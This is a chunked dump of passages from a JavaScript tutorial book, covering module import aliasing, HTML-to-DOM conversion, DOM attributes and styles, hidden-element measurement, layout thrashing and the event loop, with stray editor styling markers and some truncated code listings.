from \"greetings.js\";  finally, we test that we have access to the aliased identifier, but not the original one:  assert(typeof sayhi === \"undefined\"  && typeof sayhello === \"function\",  \"when importing, we can only access the alias\");  the situation is similar when renaming imports, as shown in the following code segment:  /************* hello.js *************/  export function greet(){  #a  return \"hello\";  #a  #a  /************* salute.js *************/  export function greet(){  #b  return \"salute\";  #b  #b  /************* main.js *************/  import { greet as sayhello } from \"hello.js\";  #c  import { greet as salute } from \"salute.js\";  #c  assert(typeof greet === \"undefined\",  #d  \"we cannot access greet\");  #d  assert(sayhello() === \"hello\" && salute() === \"salute\",  #e  \"we can access aliased identifiers!\");  #e  #a - exports a function with the name greet from the hello.js module  #b - exports a function with the same name greet from salute.js  #c - uses the as keyword to alias imports, thereby avoiding name clashes  #d - we can't access the original function name.  #e - but we can access the aliases.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":11,\\\"ch\\\":9},{\\\"line\\\":11,\\\"ch\\\":26}],[{\\\"line\\\":12,\\\"ch\\\":9},{\\\"line\\\":12,\\\"ch\\\":24}]]\"}  !@%style%@!", "javascript-12.1.txt__1": "12.1. injecting html into the dom", "javascript-12.1.txt__2": "injecting arbitrary html into a page and manipulating and inserting client-side templates  retrieving and injecting html sent from a server", "javascript-12.1.txt__3": "$(document.body).append(\"<div><h1>greetings</h1><p>yoshi here</p></div>\")  and compare that with an approach that uses only the dom api:  const h1 = document.createelement(\"h1\");  h1.textcontent = \"greetings\";  const p = document.createelement(\"p\");  p.textcontent = \"yoshi here\";  const div = document.createelement(\"div\");  div.appendchild(h1);  div.appendchild(p);  document.body.appendchild(div);  which one would you rather use?  for these reasons, we'll implement our own way of doing clean dom manipulation from scratch. the implementation requires the following steps:  convert an arbitrary but valid html string into a dom structure.  inject that dom structure into any location in the dom as efficiently as possible.  these steps provide page authors with a smart way to inject html into a document. let's get started.  12.1.1. converting html to dom  converting an html string to a dom structure doesn't involve a whole lot of magic. in fact, it uses a tool that you're most likely already familiar with: the innerhtml property of dom elements.  using it is a multistep process:  make sure that the html string contains valid html code.  wrap the string in any enclosing markup that's required by browser rules.  insert the html string, using innerhtml, into a dummy dom element.  extract the dom nodes back out.  the steps aren't overly complex, but the actual insertion has some gotchas that we'll need to take into account. let's take a look at each step in detail.  preprocessing the html source string  to start, we'll need to clean up the source html to meet our needs. for example, let's take a look at a skeleton html that allows us to choose a ninja (through the option element) and that shows the details of the chosen ninja within a table, details that are intended to be added at a later point:  <option>yoshi</option>  <option>kuma</option>  <table/>", "javascript-12.1.txt__4": "let's start with solving the problem of self-closing elements. to support this feature, we can do a quick preparse on the html string to convert elements such as <table/> to <table></table> (which will be handled uniformly in all browsers), as shown in the following listing.  listing 12.1. making sure that self-closing elements are interpreted correctly  const tags =  \u27a5 /^(area|base|br|col|embed|hr|img|input|keygen|link|menuitem|meta|param|  source|track|wbr)$/i;  #a  function convert(html) {  #b  return html.replace(  /(<(\\w+)[^>]*?)\\/>/g, (all, front, tag) => {  return tags.test(tag) ? all :  front + \"></\" + tag + \">\";  });  assert(convert(\"<a/>\") === \"<a></a>\", \"check anchor conversion.\");  assert(convert(\"<hr/>\") === \"<hr/>\", \"check hr conversion.\");  #a - uses a regular expression to match the tag name of any elements we don't need to be concerned about  #b - a function that uses regular expressions to convert self-closing tags to \u201cnormal\u201d form  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  when we apply the convert function to this example html string, we end up with the following html string:  <option>yoshi</option>  <option>kuma</option>  <table></table>  #a  #a - <table/> expanded  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":4,\\\"ch\\\":0},{\\\"line\\\":4,\\\"ch\\\":22}]]\"}  !@%style%@!  with that accomplished, we still have to solve the problem that our option elements aren't contained within a select element. let's see how to determine whether an element needs to be wrapped.  html wrapping  according to the semantics of html, some html elements must be within certain container elements before they can be injected. for example, an <option> element must be contained within a <select>.  we can solve this problem in two ways, both of which require constructing a mapping between problematic elements and their containers:  the string could be injected directly into a specific parent by using innerhtml, where the parent has been previously constructed using the built-in document createelement. although this may work in some cases and in some browsers, it isn't universally guaranteed.  the string could be wrapped with the appropriate required markup and then injected directly into any container element (such as a <div>). this is more foolproof, but it's also more work.  the second technique is preferred; it involves little browser-specific code, in contrast to the first approach, which requires a fair amount of mostly browser-specific code.  the set of problematic elements that need to be wrapped in specific container elements is fortunately a rather manageable seven. in table 12.1, the ellipses (...) indicates the locations where the elements need to be injected.  table 12.1. elements that need to be contained within other elements  element name  ancestor element  <option>, <optgroup>  <select multiple>...</select>  <legend>  <fieldset>...</fieldset>  <thead>, <tbody>, <tfoot>, <colgroup>, <caption>  <table>...</table>  <tr>  <table><thead>...</thead></table><table><tbody>...</tbody></table><table><tfoot>...</tfoot></table>  <td>, <th>  <table><tbody><tr>...</tr></tbody></table>  <col>  <table> <tbody></tbody> <colgroup>...</colgroup></table>  nearly all of these are straightforward, save for the following points, which require a bit of explanation:  a <select> element with the multiple attribute is used (as opposed to a nonmultiple select) because it won't automatically check any of the options that are placed inside it (whereas a single select will autocheck the first option).  the <col> fix includes an extra <tbody>, without which the <colgroup> won't be generated properly.  with the elements properly mapped to their wrapping requirements, let's start generating.  with the information from table 12.1, we can generate the html that we need to insert into a dom element, as shown in the following listing.  listing 12.2. generating a list of dom nodes from some markup  function getnodes(htmlstring, doc) {  const map = {  #a  \"<td\":[3,\"<table><tbody><tr>\",\"</tr></tbody></table>\"],  #a  \"<th\":[3,\"<table><tbody><tr>\",\"</tr></tbody></table>\"],  #a  \"<tr\":[2,\"<table><thead>\",\"</thead></table>\"],  #a  \"<option\":[1,\"<select multiple>\",\"</select>\"],  #a  \"<optgroup\":[1,\"<select multiple>\",\"</select>\"],  #a  \"<legend\":[1,\"<fieldset>\",\"</fieldset>\"],  #a  \"<thead\":[1,\"<table>\",\"</table>\"],  #a  \"<tbody\":[1,\"<table>\",\"</table>\"],  #a  \"<tfoot\":[1,\"<table>\",\"</table>\"],  #a  \"<colgroup\":[1,\"<table>\",\"</table>\"],  #a  \"<caption\":[1,\"<table>\",\"</table>\"],  #a  \"<col\":[2,\"<table><tbody></tbody><colgroup>\",\"</colgroup></table>\"],  };  const tagname = htmlstring.match(/<\\w+/);  #b  let mapentry = tagname ? map[tagname[0]] : null;  #b  if (!mapentry) { mapentry = [0, \" \",\" \" ];}  #c  let div = (doc || document).createelement(\"div\");  #d  div.innerhtml = mapentry[1] + htmlstring + mapentry[2];  #e  while (mapentry[0]--) { div = div.lastchild;}  #f  return div.childnodes;  #g  assert(getnodes(\"<td>test</td><td>test2</td>\").length === 2,  \"get two nodes back from the method.\");  assert(getnodes(\"<td>test</td>\")[0].nodename === \"td\",  \"verify that we're getting the right node.\");  #a - map of element types that need special parent containers. each entry has the depth of the new node, opening html for the parents, and closing html for the parents.  #b - matches the opening bracket and tag name  #c - if it's in the map, grabs the entry; otherwise, constructs a faux entry with empty \u201cparent\u201d markup and a depth of zero.  #d - creates a <div> element in which to create the new nodes. note that we use a passed document if it exists, or default to the current document if not.  #e - wraps the incoming markup with the parents from the map entry, and injects it as the inner html of the newly created <div>  #f - walks down the just-created tree to the depth indicated by the map entry. this should be the parent of the desired node created from the markup.  #g - returns the newly created element  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  we create a map of all element types that need to be placed within special parent containers, a map that contains the depth of the node, as well as the enclosing html. next, we use a regular expression to match the opening bracket and the tag name of the element we want to insert:  const tagname = htmlstring.match(/<\\w+/);  then we select a map entry, and in case there isn't one, we create a dummy entry with an empty parent element markup:  let mapentry = tagname ? map[tagname[0]] : null;  if  (!mapentry) { mapentry = [0, \" \", \" \"]; }  we follow this by creating a new div element, surrounding it with the mapped html, and inserting the newly created html into the previously created div element:  let div = (doc || document).createelement(\"div\");  div.innerhtml = mapentry[1] + htmlstring + mapentry[2]  finally, we find the parent of the desired node created from our html string, and we return the newly created node:  while (mapentry[0]--) { div = div.lastchild;}  return div.childnodes;  after all of this, we have a set of dom nodes that we can begin to insert into the document.  if we go back to our motivating example, and apply the getnodes function, we'll end up with something along the following lines:  <select multiple>  #a  <option>yoshi</option>  #a  <option>kuma</option>  #a  </select>  #a  <table></table>  #a - option elements have been wrapped inside a select element.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":6,\\\"ch\\\":0},{\\\"line\\\":6,\\\"ch\\\":63}]]\"}  !@%style%@!  12.1.2. inserting elements into the document  after we have the dom nodes, it's time to insert them into the document. a couple of steps are required, and we'll work through them in this section.", "javascript-12.1.txt__5": "this in itself is quite useful, but it also has the advantage that the fragment can be injected and cloned in a single operation instead of having to inject and clone each individual node over and over again. this has the potential to dramatically reduce the number of operations required for a page.", "javascript-12.2.txt__1": "12.2. using dom attributes and properties  when accessing the values of element attributes, we have two options: using the traditional dom methods of getattribute and setattribute, or using properties of the dom objects that correspond to the attributes.  for example, to obtain the id of an element whose reference is stored in variable e, we could use either of the following:  e.getattribute('id')  e.id  either will give us the value of the id.  let's examine the following code to better understand how attribute values and their corresponding properties behave.  listing 12.5. accessing attribute values via dom methods and properties  <div></div>  <script>  document.addeventlistener(\"domcontentloaded\", () => {  const div = document.queryselector(\"div\");  #a  div.setattribute(\"id\",\"ninja-1\");  #b  assert(div.getattribute('id') === \"ninja-1\",  #b  \"attribute successfully changed\");  #b  div.id = \"ninja-2\";  #c  assert(div.id === \"ninja-2\",  #c  \"property successfully changed\");  #c  assert(div.getattribute('id') === \"ninja-2\",  #d  \"attribute successfully changed via property\");  #d  div.setattribute(\"id\",\"ninja-3\");  #e  assert(div.id === \"ninja-3\",  \"property successfully changed via attribute\");  assert(div.getattribute('id') === \"ninja-3\",  \"attribute successfully changed\");  });  </script>  #a - obtains an element reference  #b - changes the value of the id attribute with the setattribute method and tests that the value has changed  #c - changes the value of the property and tests that the value has changed  #d - changing the property also changes the value obtained with getattribute.  #e - using setattribute also changes the value obtained through the property.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-12.2.txt__2": "in the first test, we set the id attribute to the value ninja-1 via the setattribute() method. then we assert that getattribute() returns the same value for that attribute. it should be no surprise that this test works just fine when we load the page:  div.setattribute(\"id\", \"ninja-1\");  assert(div.getattribute('id') === \"ninja-1\",  \"attribute successfully changed\");  similarly, in the next test, we set the id property to the value ninja-2 and then verify that the property value has indeed changed. no problem.  div.id = \"ninja-2\";  assert(div.id === \"ninja-2\",  \"property successfully changed\");", "javascript-12.2.txt__3": "div.id = \"ninja-3\";  assert(div.id === \"ninja-3\",  \"property successfully changed\");  assert(div.getattribute('id') === \"ninja-3\",  \"attribute successfully changed via property\");  the next test proves that it also works the other way around: setting an attribute value also changes the corresponding property value.  div.setattribute(\"id\",\"ninja-4\");  assert(div.id === \"ninja-4\",  \"property successfully changed via attribute\");  assert(div.getattribute('id') === \"ninja-4\",\"attribute changed\");  but don't let this fool you into thinking that the property and attribute are sharing the same value\u2014they aren't. we'll see later in this chapter that the attribute and corresponding property, although linked, aren't always identical.", "javascript-12.3.txt__1": "12.3. styling attribute headaches  as with general attributes, getting and setting styling attributes can be a headache. as with the attributes and properties in the previous section, we again have two approaches for handling style values: the attribute value, and the element property created from it.", "javascript-12.3.txt__2": "this section outlines the things you need to know when working with styles in browsers. let's start with a look at where style information is recorded.  12.3.1. where are my styles?", "javascript-12.3.txt__3": "many script authors are disappointed to find that no values from on-page <style> elements or external style sheets are available in the element's style object. but we won't stay disappointed for long\u2014you'll soon see a way to obtain this information.  for now, let's see how the style property gets its values. examine the following code.  listing 12.6. examining the style property  <style>  #a  div { font-size: 1.8em; border: 0 solid gold; }  </style>  <div style=\"color:#000;\" title=\"ninja power!\">  #b  \u5fcd\u8005\u30d1\u30ef\u30fc  </div>  <script>  document.addeventlistener(\"domcontentloaded\", () => {  const div = document.queryselector(\"div\");  assert(div.style.color === 'rgb(0, 0, 0)' ||  #c  div.style.color === '#000',  'color was recorded');  assert(div.style.fontsize === '1.8em',  #d  'fontsize was recorded');  assert(div.style.borderwidth === '0',  #e  'borderwidth was recorded');  div.style.borderwidth = \"4px\";  #f  assert(div.style.borderwidth === '4px',  #g  'borderwidth was replaced');  });  </script>  #a - declares an in-page style sheet that applies font size and border information  #b - this test element should receive multiple styles from various places, including its own style attribute and the style sheet.  #c - tests that the inlined color style was recorded  #d - tests that the inherited font size style was recorded  #e - tests that the inherited border width style was recorded  #f - replaces the border width style  #g - tests the border width style change was recorded  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-12.3.txt__4": "<style>  div { font-size: 1.8em; border: 0 solid gold; }  </style>  then we create a <div> element with an inlined style attribute that colors the text of the element black:", "javascript-12.3.txt__5": "assert(div.style.color === 'rgb(0, 0, 0)' ||  div.style.color === '#000',  'color was recorded');  looking ahead, in figure 12.1, we see that this test passes.  figure 12.1. by running this test, we can see that inline and assigned styles are recorded, but inherited styles aren't.", "javascript-12.3.txt__6": "assert(div.style.fontsize === '1.8em',  'fontsize was recorded');  assert(div.style.borderwidth === '0',  'borderwidth was recorded');", "javascript-12.3.txt__7": "div.style.borderwidth = \"4px\";  assert(div.style.borderwidth === '4px',  'borderwidth was replaced');  it should be noted that any values in an element's style property take precedence over anything inherited by a style sheet (even if the style sheet rule uses the !important annotation).  one thing that you may have noted in listing 12.6 is that css specifies the font size property as font-size, but in script you reference it as fontsize. why is that?  12.3.2. style property naming  css attributes cause relatively few cross-browser difficulties when it comes to accessing the values provided by the browser. but differences between how css names styles and how we access those in script do exist, and some style names differ across browsers.  css attributes that span more than one word separate the words with a hyphen; examples are font-weight, font-size, and background-color. you may recall that property names in javascript can contain a hyphen, but including a hyphen prevents the property from being accessed via the dot operator.  consider this example:  const fontsize = element.style['font-size'];  the preceding is perfectly valid. but the following isn't:  const fontsize = element.style.font-size;", "javascript-12.3.txt__8": "we can either remember to do this, or write a simple api to set or get styles that automatically handle the camel casing, as shown in the following listing.  listing 12.7. a simple method for accessing styles  <div style=\"color:red;font-size:10px;background-color:#eee;\"></div>  <script>  function style(element,name,value){  #a  name = name.replace(/-([a-z])/ig, (all,letter) => {  #b  return letter.touppercase();  });  if (typeof value !== 'undefined') {  #c  element.style[name] = value;  return element.style[name];  #d  document.addeventlistener(\"domcontentloaded\", () => {  const div = document.queryselector(\"div\");  assert(style(div,'color') === \"red\", style(div,'color'));  assert(style(div,'font-size') === \"10px\", style(div,'font-size'));  assert(style(div,'background-color') ===  \"rgb(238, 238, 238)\",style(div,'background-color'));  });  </script>  #a - defines the style function that will assign a value to a style property in case a value is provided, and in case it isn't, it will simply return the value of the style property. we can use this function for both setting and getting the value of a style property.  #b - converts name to camel case  #c - the new value of the style property is set, if a value is provided.  #d - always returns the value of the style property  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  the style function has two important characteristics:  it uses a regular expression to convert the name parameter to camel-case notation. (if the regex-driven conversion operation has you scratching your head, you might want to review the material in chapter 10.)  it can be used both as a setter and a getter, by inspecting its own argument list. for example, we can obtain the value of the font-size property with style(div, 'font-size'), and we can set a new value with style(div, 'font-size', '5px').  consider the following code:  function style(element,name,value){  ...  if (typeof value !== 'undefined') {  element.style[name] = value;  return element.style[name];", "javascript-12.3.txt__9": "the style property of an element doesn't include any style information that an element inherits from style sheets in scope for the element. many times it would be handy to know the full computed style that's been applied to an element, so let's see if there's a way to obtain that.  12.3.3. fetching computed styles", "javascript-12.3.txt__10": "figure 12.2. the final style associated with an element can come from many things: the browser builtin styles (user agent style sheet), the styles assigned through the style property, and styles from the css rules defined in css code.", "javascript-12.3.txt__11": "unlike the properties of an element's style object, the getpropertyvalue method accepts css property names (such as font-size and background-color) rather than the camel-cased versions of those names.  the following listing shows a simple example.  listing 12.8. fetching computed style values  <style>  div {  background-color: #ffc; display: inline; font-size: 1.8em;  border: 1px solid crimson; color: green;  </style>  <div style=\"color:crimson;\" id=\"testsubject\" title=\"ninja power!\">  #a  \u5fcd\u8005\u30d1\u30ef\u30fc  </div>  <script>  function fetchcomputedstyle(element,property) {  #b  const computedstyles = getcomputedstyle(element);  #c  if (computedstyles) {  #d  property = property.replace(/([a-z])/g,'-$1').tolowercase();  return computedstyles.getpropertyvalue(property);  document.addeventlistener(\"domcontentloaded\", () => {  const div = document.queryselector(\"div\");  report(\"background-color: \" +  fetchcomputedstyle(div,'background-color'));  #e  report(\"display: \" +  fetchcomputedstyle(div,'display'));  report(\"font-size: \" +  fetchcomputedstyle(div,'fontsize'));  report(\"color: \" +  fetchcomputedstyle(div,'color'));  report(\"border-top-color: \" +  fetchcomputedstyle(div,'bordertopcolor'));  report(\"border-top-width: \" +  fetchcomputedstyle(div,'border-top-width'));  });  </script>  #a - creates a test subject with a style attribute  #b - defines a function that will get the computed value of a style property  #c - uses the built-in getcomputedstyle method to obtain a descriptor object  #d - replaces camel-case notation with dashes  #e - tests that we can obtain the values of various style properties, using different notations  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-12.3.txt__12": "we then define the new function, which accepts an element and the style property that we want to find the computed value for. and to be especially friendly (after all, we're ninjas\u2014making things easier for those using our code is part of the job), we'll allow multiword property names to be specified in either format: dashed or camel-cased. in other words, we'll accept both backgroundcolor and background-color. we'll see how to accomplish that in a little bit.", "javascript-12.3.txt__13": "the first thing we want to do is to obtain the computed style interface, which we store in a variable, computedstyles, for later reference. we want to do things this way because we don't know how expensive making this call may be, and it's likely best to avoid repeating it needlessly.  const computedstyles = getcomputedstyle(element);  if (computedstyles) {  property = property.replace(/([a-z])/g,'-$1').tolowercase();  return computedstyles.getpropertyvalue(property);", "javascript-12.3.txt__14": "to test the function, we make calls to the function, passing various style names in various formats, and display the results, as shown in figure 12.3.  figure 12.3. computed styles include all styles specified with the element as well as those inherited from style sheets.", "javascript-12.3.txt__15": "we need to be aware of one more topic when dealing with style properties: amalgam properties. css allows us to use a shortcut notation for the amalgam of properties such as the border-properties. rather than forcing us to specify colors, widths, and border styles individually and for all four borders, we can use a rule such as this:", "javascript-12.3.txt__16": "border: 1px solid crimson;", "javascript-12.3.txt__17": "it can be a bit of a hassle, especially when all four styles are given the same values, but that's the hand we've been dealt.  12.3.4. converting pixel values", "javascript-12.3.txt__18": "element.style.height = \"10px\";  element.style.height = 10 + \"px\";  the following isn't safe across browsers:  element.style.height = 10;", "javascript-12.3.txt__19": "z-index  font-weight  opacity  zoom  line-height", "javascript-12.3.txt__20": "now let's take a look at a set of important style properties that can be tough to handle.  12.3.5. measuring heights and widths", "javascript-12.3.txt__21": "thankfully, the offsetheight and offsetwidth properties provide just that: a fairly reliable means to access the height and width of an element. but be aware that the values assigned to these two properties include the padding of the element. this information is usually exactly what we want if we're attempting to position one element over another. but sometimes we may want to obtain information about the element's dimensions with and without borders and padding.", "javascript-12.3.txt__22": "something to watch out for, however, is that in highly interactive sites, elements will likely spend some of their time in a nondisplayed state (with the display style being set to none), and when an element isn't part of the display, it has no dimensions. any attempt to fetch the offsetwidth or offsetheight properties of a nondisplayed element will result in a value of 0.", "javascript-12.3.txt__23": "for such hidden elements, if we want to obtain the nonhidden dimensions, we can employ a trick to momentarily unhide the element, grab the values, and hide it again. of course, we want to do so in such a way that we leave no visible clue that this is going on behind the scenes. how can we make a hidden element not hidden without making it visible?", "javascript-12.3.txt__24": "employing our ninja skills, we can do it! here's how:  change the display property to block.  set visibility to hidden.  set position to absolute.  grab the dimension values.  restore the changed properties.", "javascript-12.3.txt__25": "all that sounds more complicated than the implementation, which is shown in the following listing.  listing 12.9. grabbing the dimensions of hidden elements  <div>  lorem ipsum dolor sit amet, consectetur adipiscing elit.  suspendisse congue facilisis dignissim. fusce sodales,  odio commodo accumsan commodo, lacus odio aliquet purus,  <img src=\"../images/ninja-with-pole.png\" id=\"withpole\" alt=\"ninja pole\"/>  <img src=\"../images/ninja-with-shuriken.png\"  id=\"withshuriken\" style=\"display:none\" alt=\"ninja shuriken\" />  vel rhoncus elit sem quis libero. cum sociis natoque  penatibus et magnis dis parturient montes, nascetur  ridiculus mus. in hac habitasse platea dictumst. donec  adipiscing urna ut nibh vestibulum vitae mattis leo  rutrum. etiam a lectus ut nunc mattis laoreet at  placerat nulla. aenean tincidunt lorem eu dolor commodo  ornare.  </div>  <script  (function(){  #a  const properties = {  #b  position: \"absolute\",  visibility: \"hidden\",  display: \"block\"  };  window.getdimensions = element => {  #c  const previous = {};  #d  for (let key in properties) {  previous[key] = element.style[key];  element.style[key] = properties[key];  #e  const result = {  #f  width: element.offsetwidth,  height: element.offsetheight  };  for (let in properties) {  #g  element.style[key] = previous[key];  return result;  };  })();  document.addeventlistener(\"domcontentloaded\", () => {  settimeout(() => {  const withpole = document.getelementbyid('withpole'),  withshuriken = document.getelementbyid('withshuriken');  assert(withpole.offsetwidth === 41,  \"pole image width fetched; actual: \" +  withpole.offsetwidth + \", expected: 41\");  #h  assert(withpole.offsetheight === 48,  \"pole image height fetched: actual: \" +  withpole.offsetheight + \", expected 48\");  assert(withshuriken.offsetwidth === 36,  #i  \"shuriken image width fetched; actual: \" +  withshuriken.offsetwidth + \", expected: 36\");  assert(withshuriken.offsetheight === 48,  \"shuriken image height fetched: actual: \" +  withshuriken.offsetheight + \", expected 48\");  const dimensions = getdimensions(withshuriken);  #j  assert(dimensions.width === 36,  #k  \"shuriken image width fetched; actual: \" +  dimensions.width + \", expected: 36\");  assert(dimensions.height === 48,  \"shuriken image height fetched: actual: \" +  dimensions.height + \", expected 48\");  },3000);  });  </script>  #a - creates a private scope  #b - defines target properties  #c - creates the new function  #d - remembers settings  #e - replaces settings  #f - fetches dimensions  #g - restores settings  #h - tests visible element  #i - tests hidden element  #j - uses new function  #k - retests hidden element  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  that's a long listing, but most of it is test code; the implementation of the new dimension-fetching function spans only a dozen or so lines of code.  let's take a look at it piece by piece. first, we set up elements to test: a <div> element containing a bunch of text with two images embedded within it, left-justified by styles in an external style sheet. these image elements will be the subjects of our tests; one is visible, and one is hidden.  prior to running any script, the elements appear as shown in figure 12.4. if the second image weren't hidden, it would appear as a second ninja just to the right of the visible one.  figure 12.4. we'll use two images\u2014one visible, one hidden\u2014for testing the fetching of dimensions of hidden elements.  then we set about defining our new function. we're going to use a hash for some important information, but we don't want to pollute the global namespace with this hash; we want it to be available to the function in its local scope, but no further than that.", "javascript-12.3.txt__26": "(function(){  const properties = {  position: \"absolute\",  visibility: \"hidden\",  display: \"block\"  };  window.getdimensions = element => {  const previous = {};  for (let key in properties) {  previous[key] = element.style[key];  element.style[key] = properties[key];  const result = {  width: element.offsetwidth,  height: element.offsetheight  };  for (let key in properties) {  element.style[key] = previous[key];  return result;  };  })();", "javascript-12.3.txt__27": "that accomplished, we're ready to measure the element, which has now been made part of the display layout, invisible, and absolutely positioned. the dimensions are recorded in a hash assigned to local variable result.  now that we've pilfered what we came for, we erase our tracks by restoring the original values of the style properties that we modified, and we return the results as a hash containing width and height properties.  all well and good, but does it work? let's find out.", "javascript-12.4.txt__1": "12.4. minimizing layout thrashing  so far in this chapter, you've learned how to relatively easily modify the dom: by creating and inserting new elements, removing existing elements, or modifying their attributes. modifying the dom is one of the fundamental tools for achieving highly dynamic web applications.  but this tool also comes with usage asterisks, one of the most important being, be aware of layout thrashing. layout thrashing occurs when we perform a series of consecutive reads and writes to dom, in the process not allowing the browser to perform layout optimizations.", "javascript-12.4.txt__2": "because recalculating layout is expensive, browsers try to be as lazy as possible, by delaying working with the layout as much as they can; they try to batch as many write operations as possible on the dom in a queue so that these operations can be executed in one go. then, when an operation that requires an up-to-date layout comes along, the browser grudgingly obeys, and executes all batched operations and finally updates the layout. but sometimes, the way we'll write our code doesn't give the browser enough room to perform these sorts of optimizations, and we force the browser to perform a lot of (possibly needless) recalculations. this is what layout thrashing is all about; it occurs when our code performs a series of (often unnecessary) consecutive reads and writes to the dom, not allowing the browser to optimize layout operations. the problem is that, whenever we modify the dom, the browser has to recalculate the layout before any layout information is read. this action is expensive, in terms of performance. let's take a look at an example.", "javascript-12.4.txt__3": "listing 12.10. consecutive series of reads and writes causes layout thrashing  <div id=\"ninja\">i'm a ninja</div>  #a  <div id=\"samurai\">i'm a samurai</div>  #a  <div id=\"ronin\">i'm a ronin</div>  #a  <script>  const ninja = document.getelementbyid(\"ninja\");  #b  const samurai = document.getelementbyid(\"samurai\");  #b  const ronin = document.getelementbyid(\"ronin\");  #b  const ninjawidth = ninja.clientwidth;  #c  ninja.style.width = ninjawidth/2 + \"px\";  #c  #c  const samuraiwidth = samurai.clientwidth;  #c  samurai.style.width = samuraiwidth/2 + \"px\";  #c  #c  const roninwidth = ronin.clientwidth;  #c  ronin.style.width = roninwidth/2 + \"px\";  #c  </script>  #a - defines a few html elements  #b - fetches the elements from the dom  #c - performs a series of consecutive reads and writes. dom modifications invalidate the layout.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-12.4.txt__4": "one way of minimizing layout thrashing is to write code in a way that doesn't cause needless layout recalculations. for example, we can rewrite listing 12.10 into the following.  listing 12.11. batch dom reads and writes to avoid layout thrashing  <div id=\"ninja\">i'm a ninja</div>  <div id=\"samurai\">i'm a samurai</div>  <div id=\"ronin\">i'm a ronin</div>  <script>  const ninja = document.getelementbyid(\"ninja\");  const samurai = document.getelementbyid(\"samurai\");  const ronin = document.getelementbyid(\"ronin\");  const ninjawidth = ninja.clientwidth;  #a  const samuraiwidth = samurai.clientwidth;  #a  const roninwidth = ronin.clientwidth;  #a  ninja.style.width = ninjawidth/2 + \"px\";  #b  samurai.style.width = samuraiwidth/2 + \"px\";  #b  ronin.style.width = roninwidth/2 + \"px\";  #b  </script>  #a - batches all reads to layout properties together  #b - batches all writes to layout properties together  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  here we batch all reads and writes, because we know that no dependencies exist between the dimensions of our elements; setting the width of the ninja element doesn't influence the width of the samurai element. this allows the browser to lazily batch operations that modify the dom.", "javascript-12.4.txt__5": "table 12.2. apis and properties that cause layout invalidation  interface  property name  element", "javascript-12.4.txt__6": "mouseevent  layerx, layery, offsetx, offsety  window  getcomputedstyle, scrollby, scrollto, scroll, scrolly  frame, document, image  height, width", "javascript-12.4.txt__7": "react's virtual dom", "javascript-13.1.txt__1": "13.1. diving into the event loop", "javascript-13.1.txt__2": "examples of macrotasks include creating the main document object, parsing html, executing mainline (or global) javascript code, changing the current url, as well as various events such as page loading, input, network events, and timer events. from the browser's perspective, a macrotask represents one discrete, self-contained unit of work. after running a task, the browser can continue with other assignments such as re-rendering the ui of the page, or performing garbage collection.", "javascript-13.1.txt__3": "microtasks, on the other hand, are smaller tasks that update the application state and should be executed before the browser continues with other assignments such as re-rendering the ui. examples include promise callbacks and dom mutation changes. microtasks should be executed as soon as possible, in an asynchronous way, but without the cost of executing a whole new macrotask. microtasks enable us to execute certain actions before the ui is re-rendered, thereby avoiding unnecessary ui rendering that might show inconsistent application state.", "javascript-13.1.txt__4": "note", "javascript-13.1.txt__5": "the implementation of an event loop should use at least one queue for macrotasks and at least one queue for microtasks. event loop implementations usually go beyond that, and have several queues for different types of macro- and microtasks. this enables the event loop to prioritize types of tasks; for example, giving priority to performance-sensitive tasks such as user input. on the other hand, because there are many browsers and javascript execution environments out in the wild, you shouldn't be surprised if you run into event loops with only a single queue for both types of tasks together.", "javascript-13.1.txt__6": "the event loop is based on two fundamental principles:  tasks are handled one at a time.  a task runs to completion and can't be interrupted by another task.  let's take a look at figure 13.1, which depicts these two principles.  figure 13.1. the event loop usually has access to at least two task queues: a microtask queue and a macrotask queue. both types of tasks are handled one at a time.", "javascript-13.1.txt__7": "when the microtask queue is finally empty, the event loop checks whether a ui render update is required, and if it is, the ui is re-rendered. this ends the current iteration of the event loop, which goes back to the beginning and checks the macrotask queue again.  now that we have a high-level understanding of the event loop, let's check some of the interesting details shown in figure 13.1:", "javascript-13.1.txt__8": "both types of tasks are executed one at a time, because javascript is based on a single-threaded execution model. when a task starts executing, it's executed to its completion, without being interrupted by another task. only the browser can stop the execution of a task; for example, if the task starts being too selfish by taking up too much time or memory.", "javascript-13.1.txt__9": "all microtasks should be executed before the next rendering, because their goal is to update the application state before rendering occurs.", "javascript-13.1.txt__10": "now, let's consider three situations that can occur in the next event-loop iteration, after the browser has completed a page render:  the event loop reaches the \u201cis rendering required?\u201d decision point before another 16 ms has elapsed. because updating the ui is a complex operation, if there isn't an explicit need to render the page, the browser may choose not to perform the ui rendering in this loop iteration.  the event loop reaches the \u201cis rendering required?\u201d decision point roughly around 16 ms after the last rendering. in this case, the browser updates the ui, and users will experience a smooth-running application.", "javascript-13.1.txt__11": "note", "javascript-13.1.txt__12": "now that we've described how the event loop works, you're ready to explore a couple of examples in detail.  13.1.1. an example with only macrotasks  the unavoidable result of javascript's single-threaded execution model is that only one task can be executed at a time. this in turn means that all created tasks have to wait in a queue until their turn for execution comes.  let's focus our attention on a simple web page that contains the following:  nontrivial mainline (global) javascript code  two buttons and two nontrivial click handlers, one for each button  the following listing shows the sample code.  listing 